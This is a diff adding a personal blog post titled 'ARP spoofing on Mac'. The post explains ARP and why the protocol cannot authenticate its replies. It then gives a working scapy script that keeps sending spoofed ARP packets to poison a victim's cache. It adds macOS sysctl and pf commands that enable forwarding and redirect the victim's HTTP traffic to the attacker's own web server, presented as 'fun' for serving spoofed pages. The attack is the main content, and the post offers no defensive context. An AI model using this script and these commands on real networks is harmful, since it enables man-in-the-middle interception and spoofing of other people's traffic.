@@ -1,0 +1,148 @@
+<!doctype html>
+<html>
+<head>
+
+    <!-- Google Analytics -->
+    
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-112819737-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-112819737-1');
+</script>
+
+
+    
+
+    <meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <meta name="description" content="Tanya Marwah is a Robotics graduate student.">
+    <meta name="author" content="Tanya Marwah">
+    <link rel="alternate" type="application/rss+xml"  href="http://mohitsharma0690.github.io/feed.xml" title="Mohit Sharma RSS Feed">
+
+    <title>Tanya Marwah | ARP spoofing on Mac</title>
+
+    <link rel="stylesheet" media="all" href="/css/mine.css" />
+    <!--[if lt IE 9]>
+    <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    
+
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
+
+    <script type="text/javascript" src="//use.typekit.net/uzs7hgs.js"></script>
+    <script type="text/javascript">try{Typekit.load();}catch(e){}</script>
+
+    
+
+    <!-- Any other scripts or anything that the page may want. -->
+    
+
+    <script type="text/javascript">
+    init_mathjax = function() {
+        if (window.MathJax) {
+            // MathJax loaded
+            MathJax.Hub.Config({
+                tex2jax: {
+                    inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                    displayMath: [ ['$$','$$'], ["\\[","\\]"] ]
+                },
+                displayAlign: 'center', // Change this to 'center' to center equations.
+                "HTML-CSS": {
+                    styles: {'.MathJax_Display': {"margin": 0}}
+                }
+            });
+            MathJax.Hub.Queue(["Typeset",MathJax.Hub]);
+        }
+    }
+    init_mathjax();
+    </script>
+    <script type="text/javascript"
+        src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+
+
+</head>
+
+<body lang="en">
+    <div class="container">
+        
+        <div class="smaller_container">
+        
+            <div class="header">
+                
+                    <p>
+                        <a href="/" rel="author">
+                            <i class="fa fa-th"></i>
+                            Tanya Marwah
+                        </a>
+                    </p>
+                    <h1><p>ARP spoofing on Mac</p></h1>
+                
+            </div>
+
+            <div class="content">
+                
+                <aside>
+                    
+                </aside>
+                <p>ARP referrs to Address Resolution Protocol that is used to resolve Internet layer addresses (IP address) to link layer addresses (MAC address). Since the data transfer takes place below the link (or data link layer) every system needs to have the MAC address to be able to deliver a packet. So if I type https://google.com in my browser my request first needs to go to a gateway(usually a router) which then puts it out into the world. ARP is used to do this mapping between the IP address and the MAC address.</p>
+
+<p>ARP is a stateless protocol. Network hosts usually cache the ARP replies they receive. These mappings can be seen in the arp table using</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&gt;&gt;</span> <span class="n">arp</span> <span class="o">-</span><span class="n">a</span> </code></pre></figure>
+
+<p>The protocol consists of a simple request and reply mechanism to associate IP’s with MAC addresses. But sadly the protocol doesn’t contain any method to authenticate these ARP packets. So if somebody sends you a fake ARP request you don’t have any mechanism to confirm it’s veracity.</p>
+
+<p>If I wanted to spoof an arp table entry I would just send you a malicious ARP request. Most likely you would already have an ARP table entry for this request so it would be flagged as a duplicate but most OS’es do not discard these duplicates. For example Linux ignores unsolicited replies, but on the other hand uses seen requests from other machines to update its cache. If you constantly bombard the victim with these ARP requests the ARP table would be poisoned. Here’s a script that does that</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">op</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">victim_ip</span> <span class="o">=</span> <span class="s">''</span><span class="p">;</span> <span class="c"># victim</span>
+<span class="n">ip_to_spoof</span> <span class="o">=</span> <span class="s">''</span><span class="p">;</span> <span class="c"># gateway</span>
+<span class="n">attacker_mac</span> <span class="o">=</span> <span class="s">''</span><span class="p">;</span> <span class="c"># attacker's mac</span>
+<span class="n">arp</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="n">op</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">ip_to_spoof</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">victim_ip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">attacker_mac</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span> 
+    <span class="n">send</span><span class="p">(</span><span class="n">arp</span><span class="p">)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span></code></pre></figure>
+
+<p>It uses scapy as a dependency to create and send packets. Once you run the above script you can check the new spoofed entry in the victim’s arp table using <code class="highlighter-rouge">arp -a</code>. Now all of the victim’s traffic is going through your IP and since most likely you wouldn’t have IP forwarding enabled the victim would be getting 404’s.</p>
+
+<p>To make it a bit more fun you can also enable IP forwarding and have some fun sending spoofed pages to the victim. For example you can do this.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Enable packet forwarding on mac</span>
+<span class="nb">sudo </span>sysctl <span class="nt">-w</span> net.inet.ip.forwarding<span class="o">=</span>1
+
+<span class="c"># Enable port forwarding on mac</span>
+<span class="nb">sudo </span>pfctl <span class="nt">-e</span>
+
+<span class="c"># Add this line to your /etc/pf.conf after enabling port forwarding</span>
+rdr on en0 inet proto tcp from <span class="nv">$victim_ip</span> to any port <span class="o">=</span> 80 -&gt; 127.0.0.1
+
+<span class="c"># Reload PF configuration to apply the above filter</span>
+<span class="nb">sudo </span>pfctl <span class="nt">-f</span> /etc/pf.conf</code></pre></figure>
+
+<p>The above line redirects all HTTP traffic to the attacker’s HTTP WebServer.</p>
+
+
+                
+            </div>
+
+            
+
+            <hr />
+            <div class="footer"> Updated 10 Dec 2018 </div>
+        </div>
+        
+        </div>
+        
+    </div>
+</body>
+</html>
